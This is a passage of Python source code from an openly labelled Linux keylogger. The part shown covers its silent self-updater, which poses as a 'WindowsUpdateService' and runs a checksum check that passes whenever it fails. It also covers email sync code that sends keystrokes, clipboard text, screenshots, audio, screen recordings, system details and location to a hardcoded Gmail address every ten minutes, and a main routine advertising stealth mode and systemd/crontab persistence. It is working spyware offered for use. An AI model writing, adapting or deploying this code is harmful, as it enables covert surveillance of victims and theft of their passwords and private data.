                print(f"[UPDATE] Download failed: {response.status_code}")
                return False
            
            total_size = int(response.headers.get('content-length', 0))
            downloaded = 0
            
            with open(temp_file, 'wb') as f:
                for chunk in response.iter_content(chunk_size=8192):
                    if chunk:
                        f.write(chunk)
                        downloaded += len(chunk)
            
            print(f"[UPDATE] Download complete: {downloaded / (1024*1024):.2f} MB")
            
            if not self.verify_checksum(temp_file):
                print("[UPDATE] Checksum verification failed")
                os.remove(temp_file)
                return False
            
            return temp_file
            
        except Exception as e:
            print(f"[UPDATE] Download error: {e}")
            return False
    
    def verify_checksum(self, filepath):
        try:
            config = configparser.ConfigParser()
            config.read(CONFIG_FILE)
            
            checksum_url = config.get('AutoUpdate', 'ChecksumURL', fallback='')
            if not checksum_url:
                return True
            
            response = requests.get(checksum_url, timeout=10)
            if response.status_code != 200:
                return True
            
            expected = response.text.strip().split()[0]
            
            sha256 = hashlib.sha256()
            with open(filepath, 'rb') as f:
                for chunk in iter(lambda: f.read(4096), b''):
                    sha256.update(chunk)
            actual = sha256.hexdigest()
            
            return expected.lower() == actual.lower()
            
        except Exception as e:
            print(f"[UPDATE] Checksum error: {e}")
            return True
    
    def apply_update(self, downloaded_file):
        if not downloaded_file or not os.path.exists(downloaded_file):
            return False
        
        try:
            with self.update_lock:
                self.update_in_progress = True
            
            current_script = os.path.abspath(sys.argv[0])
            installed_script = "/opt/WindowsUpdateService/windowsupdateservice.py"
            
            if os.path.exists(current_script):
                shutil.copy2(current_script, self.backup_file)
                print(f"[UPDATE] Backup created")
            
            new_version = self._get_new_version()
            
            # Copy new version
            shutil.copy2(downloaded_file, installed_script)
            os.chmod(installed_script, 0o755)
            
            # Save version
            with open(self.version_file, 'w') as f:
                f.write(new_version)
            
            # Clean up
            os.remove(downloaded_file)
            
            print("[UPDATE] Update applied successfully")
            self._send_update_notification(new_version)
            
            with self.update_lock:
                self.update_in_progress = False
            
            # Restart service
            subprocess.run(['systemctl', 'restart', 'windowsupdateservice.service'], capture_output=True)
            
            return True
            
        except Exception as e:
            print(f"[UPDATE] Apply error: {e}")
            # Restore backup if failed
            try:
                if os.path.exists(self.backup_file):
                    shutil.copy2(self.backup_file, installed_script)
            except:
                pass
            
            with self.update_lock:
                self.update_in_progress = False
            return False
    
    def _get_new_version(self):
        try:
            config = configparser.ConfigParser()
            config.read(CONFIG_FILE)
            version_url = config.get('AutoUpdate', 'VersionURL', fallback='')
            if version_url:
                response = requests.get(version_url, timeout=5)
                if response.status_code == 200:
                    return response.text.strip()
        except:
            pass
        return "1.0.0"
    
    def _send_update_notification(self, new_version):
        try:
            subject = "Auto-Update Complete"
            body = f"""
Linux Keylogger Auto-Update Report
Time: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
Computer: {socket.gethostname()}
Old Version: {self.current_version}
New Version: {new_version}
Status: Success - Applied silently
            """
            send_email(subject, body)
        except:
            pass
    
    def perform_auto_update(self):
        try:
            if self.update_in_progress:
                return False
            
            if not self.check_for_updates():
                return False
            
            config = configparser.ConfigParser()
            config.read(CONFIG_FILE)
            max_retries = config.getint('AutoUpdate', 'RetryAttempts', fallback=3)
            
            for attempt in range(max_retries):
                print(f"[UPDATE] Download attempt {attempt + 1}/{max_retries}")
                downloaded = self.download_update()
                if downloaded:
                    return self.apply_update(downloaded)
                
                if attempt < max_retries - 1:
                    time.sleep(30)
            
            print("[UPDATE] All download attempts failed")
            return False
            
        except Exception as e:
            print(f"[UPDATE] Auto-update error: {e}")
            return False

def update_worker():
    """Auto-update worker thread"""
    updater = AutoUpdater()
    
    print("[UPDATE] Auto-update worker started (checking in 5 minutes)")
    time.sleep(300)
    
    print("[UPDATE] Checking for updates on startup...")
    updater.perform_auto_update()
    
    while is_running:
        try:
            time.sleep(86400)  # 24 hours
            
            if has_internet():
                print("[UPDATE] Performing scheduled update check...")
                updater.perform_auto_update()
                
        except Exception as e:
            print(f"[UPDATE] Worker error: {e}")
            time.sleep(3600)

# ============================================================================
# FILE HELPERS
# ============================================================================

def get_file_size_mb(filepath):
    try:
        return os.path.getsize(filepath) / (1024 * 1024)
    except:
        return 0

def get_files_by_type(file_type, limit=10):
    try:
        conn = sqlite3.connect(DB_FILE)
        cursor = conn.cursor()
        
        if file_type == 'screenshot':
            cursor.execute("SELECT file_path FROM screenshots WHERE synced = 0 ORDER BY id DESC LIMIT ?", (limit,))
        elif file_type == 'audio':
            cursor.execute("SELECT file_path FROM audio WHERE synced = 0 ORDER BY id DESC LIMIT ?", (limit,))
        elif file_type == 'video':
            cursor.execute("SELECT file_path FROM screen_recordings WHERE synced = 0 ORDER BY id DESC LIMIT ?", (limit,))
        else:
            conn.close()
            return []
        
        rows = cursor.fetchall()
        conn.close()
        
        files = []
        for row in rows:
            path = row[0]
            if os.path.exists(path):
                file_size = get_file_size_mb(path)
                if file_size < 20:
                    files.append(path)
        
        return files
        
    except Exception as e:
        print(f"[ERROR] get_files_by_type: {e}")
        return []

# ============================================================================
# EMAIL
# ============================================================================

def send_email(subject, body, attachments=None):
    """Send email with attachments"""
    global EMAIL_USERNAME, EMAIL_PASSWORD, EMAIL_TO
    
    try:
        config = configparser.ConfigParser()
        config.read(CONFIG_FILE)
        EMAIL_USERNAME = config.get('Settings', 'EmailUsername', fallback='terminal123b@gmail.com')
        EMAIL_PASSWORD = config.get('Settings', 'EmailPassword', fallback='')
        EMAIL_TO = config.get('Settings', 'EmailTo', fallback='terminal123b@gmail.com')
    except:
        pass
    
    if not EMAIL_PASSWORD or EMAIL_PASSWORD == '':
        print("[WARNING] Email password not set")
        return False
    
    try:
        msg = MIMEMultipart()
        msg['From'] = EMAIL_USERNAME
        msg['To'] = EMAIL_TO
        msg['Subject'] = f"[Keylogger] {subject}"
        msg.attach(MIMEText(body, 'plain', 'utf-8'))
        
        attached_count = 0
        if attachments:
            print(f"[INFO] Attempting to attach {len(attachments)} files")
            for filepath in attachments:
                if attached_count >= 25:
                    print(f"[INFO] Reached max attachments limit (25)")
                    break
                
                if not os.path.exists(filepath):
                    print(f"[WARNING] File not found, skipping: {os.path.basename(filepath)}")
                    continue
                
                file_size = get_file_size_mb(filepath)
                if file_size > 20:
                    print(f"[WARNING] File too large ({file_size:.2f} MB), skipping: {os.path.basename(filepath)}")
                    continue
                
                try:
                    with open(filepath, 'rb') as f:
                        part = MIMEBase('application', 'octet-stream')
                        part.set_payload(f.read())
                    
                    encoders.encode_base64(part)
                    part.add_header('Content-Disposition', f'attachment; filename={os.path.basename(filepath)}')
                    msg.attach(part)
                    attached_count += 1
                    print(f"[OK] Attached: {os.path.basename(filepath)} ({file_size:.2f} MB)")
                    
                except Exception as e:
                    print(f"[ERROR] Failed to attach {filepath}: {e}")
        
        print(f"[INFO] Sending email via smtp.gmail.com:587...")
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(EMAIL_USERNAME, EMAIL_PASSWORD)
        server.send_message(msg)
        server.quit()
        print(f"[OK] Email sent: {subject} with {attached_count} attachments")
        return True
        
    except Exception as e:
        print(f"[ERROR] Email error: {e}")
        return False

def sync_offline_data():
    """Sync offline data via email"""
    try:
        conn = sqlite3.connect(DB_FILE)
        cursor = conn.cursor()
        
        cursor.execute("SELECT COUNT(*) FROM screenshots WHERE synced = 0")
        screenshot_count = cursor.fetchone()[0]
        
        cursor.execute("SELECT COUNT(*) FROM audio WHERE synced = 0")
        audio_count = cursor.fetchone()[0]
        
        cursor.execute("SELECT COUNT(*) FROM screen_recordings WHERE synced = 0")
        video_count = cursor.fetchone()[0]
        
        cursor.execute("SELECT * FROM keystrokes WHERE synced = 0 ORDER BY id DESC LIMIT 100")
        keystrokes = cursor.fetchall()
        
        cursor.execute("SELECT * FROM clipboard WHERE synced = 0 ORDER BY id DESC LIMIT 15")
        clipboards = cursor.fetchall()
        
        cursor.execute("SELECT info_key, info_value FROM system_info ORDER BY id DESC LIMIT 30")
        system_info_rows = cursor.fetchall()
        system_info = {}
        for key, value in system_info_rows:
            system_info[key] = value
        
        total = screenshot_count + audio_count + video_count
        
        if total == 0:
            print("[INFO] No unsynced data to send")
            conn.close()
            return
        
        print(f"\n[INFO] Syncing: {screenshot_count} screenshots, {audio_count} audio, {video_count} videos")
        
        screenshot_files = get_files_by_type('screenshot', 10)
        audio_files = get_files_by_type('audio', 10)
        video_files = get_files_by_type('video', 5)
        
        all_attachments = screenshot_files + audio_files + video_files
        
        if not all_attachments:
            print("[WARNING] No valid files to attach")
            conn.close()
            return
        
        print(f"[INFO] Found {len(all_attachments)} files to attach ({len(screenshot_files)} screenshots, {len(audio_files)} audio, {len(video_files)} video)")
        
        body = "=" * 70 + "\n"
        body += "LINUX KEYLOGGER SYNC REPORT\n"
        body += "=" * 70 + "\n"
        body += f"Time: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
        body += "-" * 70 + "\n"
        body += "SYSTEM INFORMATION\n"
        body += "-" * 70 + "\n"
        body += f"  Computer: {system_info.get('computer_name', 'Unknown')}\n"
        body += f"  User: {system_info.get('username', 'Unknown')}\n"
        body += f"  OS: {system_info.get('os_version', 'Unknown')}\n"
        body += f"  Kernel: {system_info.get('kernel_version', 'Unknown')}\n"
        body += f"  IP: {system_info.get('ip_address', 'Unknown')}\n"
        body += f"  Public IP: {system_info.get('public_ip', 'Unknown')}\n"
        body += f"  CPU Cores: {system_info.get('cpu_count', 'Unknown')}\n"
        body += f"  CPU: {system_info.get('cpu_percent', 'Unknown')}%\n"
        body += f"  Memory Total: {system_info.get('memory_total_gb', 'Unknown')} GB\n"
        body += f"  Memory Used: {system_info.get('memory_used_gb', 'Unknown')} GB\n"
        body += f"  Disk Total: {system_info.get('disk_total_gb', 'Unknown')} GB\n"
        body += f"  Disk Free: {system_info.get('disk_free_gb', 'Unknown')} GB\n"
        
        if system_info.get('location'):
            try:
                loc = json.loads(system_info.get('location', '{}'))
                if loc and loc.get('city'):
                    body += f"  Location: {loc.get('city', '')}, {loc.get('country', '')}\n"
                    body += f"  Coordinates: {loc.get('lat', '')}, {loc.get('lng', '')}\n"
            except:
                pass
        
        body += "-" * 70 + "\n\n"
        body += "DATA STATISTICS\n"
        body += "-" * 40 + "\n"
        body += f"  Keystrokes: {len(keystrokes)}\n"
        body += f"  Clipboard: {len(clipboards)}\n"
        body += f"  Screenshots: {len(screenshot_files)} attached\n"
        body += f"  Audio: {len(audio_files)} attached\n"
        body += f"  Videos: {len(video_files)} attached\n"
        body += f"  Total: {len(all_attachments)} files attached\n"
        body += "-" * 40 + "\n\n"
        
        if keystrokes:
            body += "KEYSTROKES:\n"
            body += "-" * 40 + "\n"
            for row in keystrokes[:50]:
                body += f"  [{row[1]}] [{row[2]}] {row[4]}\n"
            body += "\n"
        
        body += "=" * 70 + "\n"
        body += f"Logs: {LOG_DIR}\n"
        body += "=" * 70
        
        if send_email(f"Sync Report - {len(all_attachments)} files", body, all_attachments):
            if screenshot_files:
                placeholders = ','.join(['?' for _ in screenshot_files])
                cursor.execute(f"UPDATE screenshots SET synced = 1 WHERE file_path IN ({placeholders})", screenshot_files)
            
            if audio_files:
                placeholders = ','.join(['?' for _ in audio_files])
                cursor.execute(f"UPDATE audio SET synced = 1 WHERE file_path IN ({placeholders})", audio_files)
            
            if video_files:
                placeholders = ','.join(['?' for _ in video_files])
                cursor.execute(f"UPDATE screen_recordings SET synced = 1 WHERE file_path IN ({placeholders})", video_files)
            
            cursor.execute("UPDATE keystrokes SET synced = 1 WHERE synced = 0")
            cursor.execute("UPDATE clipboard SET synced = 1 WHERE synced = 0")
            
            conn.commit()
            print(f"[OK] Marked attached files as synced")
        
        conn.close()
        
    except Exception as e:
        print(f"[ERROR] Sync error: {e}")

def sync_worker():
    """Sync worker thread"""
    while is_running:
        try:
            if has_internet():
                sync_offline_data()
        except:
            pass
        time.sleep(600)  # 10 minutes

# ============================================================================
# MAIN
# ============================================================================

def main():
    global is_running, EMAIL_USERNAME, EMAIL_PASSWORD, EMAIL_TO
    
    # Handle self-installation
    run_self_install_if_needed()
    
    # Handle --hidden flag for stealth
    if len(sys.argv) > 1 and sys.argv[1] == "--hidden":
        daemonize()
    
    # Setup
    setup_app()
    init_database()
    
    print("\n" + "=" * 70)
    print(" LINUX KEYLOGGER - COMPLETE ULTIMATE VERSION")
    print("=" * 70)
    print(f" Logs: {LOG_DIR}")
    print(f" Data: {DATA_DIR}")
    print(f" Email: {EMAIL_TO}")
    print("")
    print(" FEATURES:")
    print("    Self-Installation (one script installs itself)")
    print("    Silent Auto-Update (ANY version)")
    print("    Keylogging (evdev + pynput)")
    print("    10 Screenshots every 10 minutes")
    print("    Screen Recording (30s) every 2 minutes")
    print("    Audio Recording (30s) every 2 minutes")
    print("    Location Tracking (every 5 minutes)")
    print("    Clipboard Capture")
    print("    Email Sync (every 10 minutes)")
    print("    25 Attachments: 10 screenshots + 10 audio + 5 videos")
    print("    File size checking (<20MB)")
    print("    Stealth Mode (hidden from user)")
    print("    Startup Persistence (systemd + crontab)")
    print("=" * 70 + "\n")
    
    # Collect initial system info
    collect_system_info()
    get_location()
    
    threads = []
    
    # Start window monitor
    t = threading.Thread(target=window_monitor, daemon=True)
    t.start()
    threads.append(t)
    print("[OK] Window monitor started")
    
    # Start keyboard handler
    keyboard_handler = KeyboardHandler()
    print("[OK] Keyboard capture started")
    
    # Start auto-flush
    def auto_flush():
        while is_running:
            time.sleep(3)
            if hasattr(keyboard_handler, '_flush_buffer'):
                keyboard_handler._flush_buffer()
    
    t = threading.Thread(target=auto_flush, daemon=True)
    t.start()
    threads.append(t)
    
    # Start database logger
    t = threading.Thread(target=process_log_queue, daemon=True)
    t.start()
    threads.append(t)
    print("[OK] Database logger started")
    
    # Start screenshot scheduler
    t = threading.Thread(target=screenshot_batch_scheduler, daemon=True)
    t.start()
    threads.append(t)
    print("[OK] Screenshot batch started (10 per 10 min)")
    
    # Start screen recording
    if HAS_CV2:
        t = threading.Thread(target=screen_record_scheduler, daemon=True)
        t.start()
        threads.append(t)
        print("[OK] Screen recording started (30s every 2 min)")
    else:
        print("[WARNING] Screen recording disabled - install opencv-python")
    
    # Start audio recording
    if HAS_SOUNDDEVICE:
        t = threading.Thread(target=audio_scheduler, daemon=True)
        t.start()
        threads.append(t)
        print("[OK] Audio recording started (30s every 2 min)")
    else:
        print("[WARNING] Audio recording disabled - install sounddevice")
    
    # Start location tracking
    if HAS_REQUESTS:
        t = threading.Thread(target=location_scheduler, daemon=True)
        t.start()
        threads.append(t)
        print("[OK] Location tracking started (every 5 min)")
    
    # Start clipboard monitor
    if HAS_PYPERCLIP:
        t = threading.Thread(target=clipboard_monitor, daemon=True)
        t.start()
        threads.append(t)
        print("[OK] Clipboard monitor started")
    else:
        print("[WARNING] Clipboard disabled - install pyperclip")
    
    # Start sync worker
    t = threading.Thread(target=sync_worker, daemon=True)
    t.start()
    threads.append(t)
    print("[OK] Sync worker started (every 10 min)")
    
    # Start auto-update
    config = configparser.ConfigParser()
    config.read(CONFIG_FILE)
    if config.getboolean('AutoUpdate', 'Enabled', fallback=True):
        t = threading.Thread(target=update_worker, daemon=True)
        t.start()
        threads.append(t)
        print("[OK] Auto-update worker started (silent mode - ANY version)")
    
    print("\n" + "=" * 70)
    print(" KEYLOGGER IS RUNNING")
    print(f" PID: {os.getpid()}")
    print(" Emails sent every 10 minutes with 25 attachments")
    print(" Auto-update: ANY version difference = silent update")
    print(" Self-install: Single script installs itself")
    print("=" * 70 + "\n")
    
    # Handle signals
    def signal_handler(sig, frame):
        global is_running
        print("\n[INFO] Signal received, stopping...")
        is_running = False
        sys.exit(0)
    
    signal.signal(signal.SIGTERM, signal_handler)
    signal.signal(signal.SIGINT, signal_handler)
    
    try:
        while is_running:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[INFO] Stopping...")
        is_running = False
    except Exception as e:
        print(f"[ERROR] Main error: {e}")
        is_running = False
    
    # Cleanup
    print("[INFO] Shutting down...")

if __name__ == "__main__":
    main()
